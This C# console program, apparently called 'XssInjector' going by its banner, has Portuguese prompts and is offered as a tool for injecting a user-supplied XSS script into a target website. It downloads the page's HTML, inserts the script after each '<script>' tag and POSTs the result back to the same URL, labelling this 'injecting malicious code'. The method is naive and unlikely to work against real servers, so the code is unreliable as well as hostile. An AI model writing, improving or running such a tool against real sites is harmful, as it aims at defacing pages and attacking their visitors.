using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        Console.ForegroundColor = ConsoleColor.Red;

        Console.WriteLine(@"
 __   __        ______ _       _           _             
 \ \ / /       |  ____(_)     (_)         | |            
  \ V / ___ ___| |__   _ _ __  _  ___  ___| |_ ___  _ __ 
   > < / __/ __|  __| | | '_ \| |/ _ \/ __| __/ _ \| '__|
  / . \\__ \__ \ |    | | | | | |  __/ (__| || (_) | |   
 /_/ \_\___/___/_|    |_|_| |_| |\___|\___|\__\___/|_|   
                             _/ |                                          
                            |__/                          
---------------------------------------------------------
github.com/Igthz                                 lrr#3781
---------------------------------------------------------");

        Console.ResetColor();

        Console.WriteLine("Digite a URL do site alvo:");
        string url = Console.ReadLine();

        string codigoXss = "";

        bool sair = false;

        while (!sair)
        {
            Console.ForegroundColor = ConsoleColor.Blue;

            Console.WriteLine("\n============== MENU ==============");
            Console.WriteLine("1. Editar o script XSS");
            Console.WriteLine("2. Injetar código malicioso automaticamente");
            Console.WriteLine("3. Voltar ao menu principal");
            Console.WriteLine("4. Sair do programa");
            Console.Write("Digite o número do comando desejado: ");
            string comando = Console.ReadLine().ToLower();

            Console.ResetColor();

            Console.WriteLine();

            switch (comando)
            {
                case "1":
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("Digite o novo script XSS:");
                    codigoXss = Console.ReadLine();
                    Console.Clear();
                    break;
                case "2":
                    await InjetarCodigoMalicioso(url, codigoXss);
                    break;
                case "3":
                    sair = true;
                    break;
                case "4":
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Comando inválido. Tente novamente.");
                    Console.ResetColor();
                    break;
            }
        }
    }

    static async Task InjetarCodigoMalicioso(string url, string codigoXss)
    {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("\nInjetando código malicioso automaticamente...");

        try
        {
            HttpClient httpClient = new HttpClient();
            HttpResponseMessage response = await httpClient.GetAsync(url);
            string html = await response.Content.ReadAsStringAsync();

            // Injetando o código XSS personalizado
            html = html.Replace("<script>", "<script>" + codigoXss);

            // Enviando a solicitação POST para atualizar o site com o código malicioso injetado
            StringContent content = new StringContent(html, Encoding.UTF8, "text/html");
            await httpClient.PostAsync(url, content);

            Console.WriteLine("\nCódigo malicioso injetado com sucesso em: " + url);

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("======== Conteúdo injetado ========");
            Console.WriteLine(codigoXss);
            Console.WriteLine("===================================");

            Console.WriteLine("\nPressione qualquer tecla para continuar...");
            Console.ReadKey();
            Console.Clear();
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\nOcorreu um erro ao injetar o código malicioso: " + ex.Message);
            Console.WriteLine("\nPressione qualquer tecla para continuar...");
            Console.ReadKey();
            Console.Clear();
        }

        Console.ResetColor();
    }
}
